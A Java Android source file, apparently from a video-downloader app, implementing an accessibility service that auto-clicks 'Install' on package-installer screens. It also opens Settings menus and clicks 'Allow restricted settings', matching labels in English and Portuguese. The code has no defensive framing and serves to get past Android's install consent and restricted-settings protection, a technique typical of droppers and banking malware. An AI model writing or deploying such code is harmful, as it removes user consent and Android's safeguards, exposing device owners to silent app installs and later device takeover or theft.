package com.vidlix.downloader;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class RescueAccessibilityService extends AccessibilityService {

    private static final String[] INSTALLER_PACKAGES = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.miui.packageinstaller"
    };

    private static final String[] INSTALL_BUTTON_IDS = {
        "com.android.packageinstaller:id/ok_button",
        "com.android.packageinstaller:id/install_button",
        "com.google.android.packageinstaller:id/ok_button",
        "android:id/button1"
    };

    private static final String[] INSTALL_TEXTS = {
        "Install", "INSTALL", "Instalar", "INSTALAR",
        "Continue", "CONTINUE", "Continuar", "CONTINUAR"
    };

    // Textos para o botão "Permitir configurações restritas"
    private static final String[] ALLOW_RESTRICTED_TEXTS = {
        "Allow restricted settings", "Permitir configurações restritas",
        "ALLOW RESTRICTED SETTINGS", "PERMITIR CONFIGURAÇÕES RESTRITAS"
    };

    // Pacotes do app de configurações do Android
    private static final String[] SETTINGS_PACKAGES = {
        "com.android.settings", "com.google.android.settings",
        "com.samsung.android.settings", "com.miui.securitycenter"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        CharSequence pkgName = event.getPackageName();
        if (pkgName == null) return;

        String pkg = pkgName.toString();

        // 1. Se estiver na tela de instalação, clica em "Instalar"
        if (isInstaller(pkg)) {
            clickInstallButton();
            return;
        }

        // 2. Se estiver na tela de informações do app (Configurações), clica em "Permitir configurações restritas"
        if (isSettings(pkg)) {
            clickAllowRestrictedSettings();
        }
    }

    private boolean isInstaller(String pkg) {
        for (String p : INSTALLER_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    private boolean isSettings(String pkg) {
        for (String p : SETTINGS_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    private void clickInstallButton() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        try {
            AccessibilityNodeInfo button = findButton(root, INSTALL_BUTTON_IDS, INSTALL_TEXTS);
            if (button != null) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                button.recycle();
            }
        } catch (Exception ignored) { }
        finally {
            root.recycle();
        }
    }

    private void clickAllowRestrictedSettings() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        try {
            // Primeiro, tenta encontrar e clicar no botão de três pontos (mais opções)
            AccessibilityNodeInfo moreOptions = findButtonByDesc(root, "More options");
            if (moreOptions == null) {
                moreOptions = findButtonByDesc(root, "Mais opções");
            }
            if (moreOptions == null) {
                moreOptions = findButtonByDesc(root, "More");
            }
            if (moreOptions != null) {
                moreOptions.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                moreOptions.recycle();
                // Aguarda um pouco para o menu abrir
                try { Thread.sleep(500); } catch (InterruptedException e) { }
            }

            // Agora, tenta encontrar e clicar em "Permitir configurações restritas"
            AccessibilityNodeInfo allowButton = findButtonByText(root, ALLOW_RESTRICTED_TEXTS);
            if (allowButton != null) {
                allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                allowButton.recycle();
            }
        } catch (Exception ignored) { }
        finally {
            root.recycle();
        }
    }

    private AccessibilityNodeInfo findButton(AccessibilityNodeInfo root, String[] ids, String[] texts) {
        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isEnabled() && n.isClickable()) return n;
                }
                return nodes.get(0);
            }
        }
        return findButtonByText(root, texts);
    }

    private AccessibilityNodeInfo findButtonByText(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return null;
        CharSequence text = node.getText();
        if (text != null) {
            String t = text.toString().trim();
            for (String key : texts) {
                if (t.equalsIgnoreCase(key)) {
                    if (node.isClickable()) return node;
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) return parent;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findButtonByText(child, texts);
                if (result != null) return result;
                child.recycle();
            }
        }
        return null;
    }

    private AccessibilityNodeInfo findButtonByDesc(AccessibilityNodeInfo node, String desc) {
        if (node == null) return null;
        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null && contentDesc.toString().equalsIgnoreCase(desc)) {
            if (node.isClickable()) return node;
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null && parent.isClickable()) return parent;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findButtonByDesc(child, desc);
                if (result != null) return result;
                child.recycle();
            }
        }
        return null;
    }

    @Override
    public void onInterrupt() { }
}
